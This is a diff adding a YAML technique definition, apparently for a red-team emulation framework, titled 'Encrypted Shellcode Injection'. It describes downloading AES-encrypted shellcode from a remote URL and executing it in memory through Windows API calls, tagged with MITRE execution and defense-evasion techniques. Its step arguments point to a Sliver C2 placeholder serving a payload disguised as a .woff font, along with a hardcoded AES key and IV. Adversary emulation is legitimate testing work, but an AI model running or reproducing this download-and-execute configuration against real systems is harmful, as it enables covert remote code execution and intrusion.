@@ -1,0 +1,37 @@
+---
+api_version: 2.0
+uuid: a1ff7869-fdb0-4815-9f27-2b8f708ba7cb
+name: "Encrypted Shellcode Injection"
+authors:
+  - godlovepenn
+description: |
+  This TTP downloads AES-CBC encrypted shellcode from a remote URL, decrypts it,
+  and executes it in-memory using Windows API calls. The execution flow is:
+  VirtualAlloc (PAGE_READWRITE) -> RtlMoveMemory -> VirtualProtect (PAGE_EXECUTE_READ)
+  -> CreateThread -> WaitForSingleObject.
+
+  The shellcode URL, AES key, and IV are configurable.
+requirements:
+  platforms:
+    - os: windows
+mitre:
+  tactics:
+    - TA0002 Execution
+    - TA0005 Defense Evasion
+  techniques:
+    - T1027 Obfuscated Files or Information
+    - T1055 Process Injection
+  subtechniques:
+    - T1218 Signed Binary Proxy Execution
+steps:
+  - name: shellcode_injection
+    file: src/main.py
+    args:
+      - '--url'
+      - '<Sliver C2>/files.woff'
+      - '--aes-key'
+      - 'D(G+KbPeShVmYq4t'
+      - '--aes-iv'
+      - '8y/B?E(G+KbPeShV'
+      - '--sleep'
+      - '4'
